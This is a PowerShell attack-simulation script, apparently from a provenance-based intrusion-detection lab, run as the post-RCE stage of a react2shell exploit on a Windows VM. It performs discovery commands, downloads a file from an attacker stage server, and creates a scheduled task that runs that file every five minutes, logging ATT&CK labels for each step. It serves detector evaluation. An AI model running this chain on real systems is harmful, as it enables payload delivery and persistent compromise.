<#
  rce-killchain.ps1 — the demo's ONE attack (replaces the old 01..10 scenarios).

  Runs ON the Windows target as a child of the RCE shell (node.exe -> powershell -> this script),
  which is exactly the anomalous provenance OCR-APT should flag. It does NOT exploit anything itself:
  the Kali attacker (tools/launch_exploit.py) exploits react2shell and delivers this script as the
  stage. See SCENARIOS.md for the phase/ATT&CK table and README.md for the run recipe.

  Compact chain (user decision 2026-10-18):
    Initial access / execution ... T1190 + T1059.001   (the delivery itself; labelled by the launcher-
                                                         chosen shell. Here we only mark it.)
    Discovery .................... T1033 T1082 T1057 T1016
    Ingress tool transfer ........ T1105                (download a marker from the Kali stage server)
    Persistence .................. T1053.005            (scheduled task running the downloaded tool)

  Each step self-logs a ground-truth record via Write-AttackLabel (lib\attack-lib.ps1), the label
  oracle joined to the graph (LABELING.md, DEVIATIONS D6).

  PowerShell notes for the reader: "param(...)" = named flags; "[switch]$X" = boolean flag; a
  "-Action { ... }" scriptblock is a lambda the helper times and labels; "$($h):$p" avoids PowerShell
  reading "$h:" as a scope qualifier.
#>
param(
    # Where this script fetched its stage from (the Kali attacker). The launcher substitutes these;
    # defaults keep a manual run on the VM working. ${attacker}:${StagePort} is the T1105/C2 endpoint.
    [string]$Attacker  = $(if ($env:LAB_ATTACKER)   { $env:LAB_ATTACKER }   else { "10.21.2.30" }),
    [int]   $StagePort = $(if ($env:LAB_STAGE_PORT) { [int]$env:LAB_STAGE_PORT } else { 8080 }),
    [switch]$SelfTest   # dry run: stub the actions, prove one well-formed label line is written, exit 0.
)

# Reuse the canonical helpers. When delivered as the combined stage (iex), they are already in scope;
# when run by hand from the pack on the VM, dot-source them.
if (-not (Get-Command Write-AttackLabel -ErrorAction SilentlyContinue)) {
    . "$PSScriptRoot\..\lib\attack-lib.ps1"
}

if ($SelfTest) {
    # Prove-it-runs only (CLAUDE §6): temporary label file, stubbed actions, check the JSONL shape.
    $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("rce-selftest-{0}.jsonl" -f ([guid]::NewGuid()))
    Initialize-AttackLab -LabelFile $tmp
    Write-AttackLabel -Technique "T1082" -Tactic "discovery" `
        -Start ([DateTime]::UtcNow) -End ([DateTime]::UtcNow) `
        -ProcessIndicators @("systeminfo.exe") -Note "selftest" -Source "custom"
    $line = Get-Content $tmp -First 1 | ConvertFrom-Json
    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    if ($line.technique -eq "T1082" -and $line.malicious -eq $true) {
        Write-Host "[selftest] OK — label record well-formed" -ForegroundColor Green; exit 0
    } else { Write-Error "[selftest] FAIL — bad label record"; exit 1 }
}

Initialize-AttackLab   # labels -> C:\lab-labels\attack-labels.jsonl, host SimulatedW10
$stageBase = "http://$($Attacker):$($StagePort)"
$toolPath  = "C:\Users\Public\downloaded_tool.bin"
$taskName  = "UpdaterSync"   # the persistence artefact; cleanup-all.ps1 deletes this exact name

Write-Host "[rce] killchain starting; stage/C2 = $stageBase" -ForegroundColor Magenta

# --- the RCE itself (marker only; the real exec is the delivery that launched this script) ----------
# process_indicators: the shell the launcher used. node.exe is react2shell; powershell.exe is the child.
Write-AttackLabel -Technique "T1190" -Tactic "initial-access" `
    -Start ([DateTime]::UtcNow) -End ([DateTime]::UtcNow) `
    -ProcessIndicators @("node.exe","powershell.exe") `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Exploit public-facing app (react2shell) -> RCE; T1059.001 PowerShell stage" -Source "custom"

# --- Phase 1: Discovery (several short-lived processes, all children of this shell) -----------------
Invoke-LabeledStep -Technique "T1033" -Tactic "discovery" `
    -ProcessIndicators @("whoami.exe") -Note "System owner/user" -Action {
        & whoami /all | Out-Null
    }
Invoke-LabeledStep -Technique "T1082" -Tactic "discovery" `
    -ProcessIndicators @("systeminfo.exe","hostname.exe") -Note "System information" -Action {
        & systeminfo | Out-Null; & hostname | Out-Null
    }
Invoke-LabeledStep -Technique "T1057" -Tactic "discovery" `
    -ProcessIndicators @("tasklist.exe") -Note "Process discovery" -Action {
        & tasklist | Out-Null
    }
Invoke-LabeledStep -Technique "T1016" -Tactic "discovery" `
    -ProcessIndicators @("ipconfig.exe","netstat.exe","net.exe") -Note "Network config + connections" -Action {
        & ipconfig /all | Out-Null; & netstat -ano | Out-Null; & net user | Out-Null
    }

# --- Phase 2: Ingress tool transfer (T1105) — FILE node + NET node to the Kali stage server ---------
Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
    -ProcessIndicators @("powershell.exe") `
    -FileIndicators @($toolPath) `
    -NetworkIndicators @("$($Attacker):$StagePort") `
    -Note "Download cradle from attacker stage server" -Action {
        $uri = "$stageBase/tool.bin"
        try { Invoke-WebRequest -Uri $uri -OutFile $toolPath -UseBasicParsing -TimeoutSec 10 }
        catch { Write-Warning "download failed ($uri) — the connection attempt still produced NET telemetry" }
    }

# --- Phase 3: Persistence (T1053.005) — scheduled task that runs the downloaded tool ----------------
Invoke-LabeledStep -Technique "T1053.005" -Tactic "persistence" `
    -ProcessIndicators @("schtasks.exe") `
    -FileIndicators @($toolPath,"C:\Windows\System32\Tasks\$taskName") `
    -Note "Scheduled task persistence ($taskName)" -Action {
        & schtasks /create /tn $taskName /tr "cmd /c `"$toolPath`"" /sc minute /mo 5 /f | Out-Null
    }

Write-Host "[rce] killchain complete. Labels appended to C:\lab-labels\attack-labels.jsonl" -ForegroundColor Magenta
Write-Host "[rce] reset with cleanup-all.ps1 (or restore the VM snapshot)." -ForegroundColor DarkGray
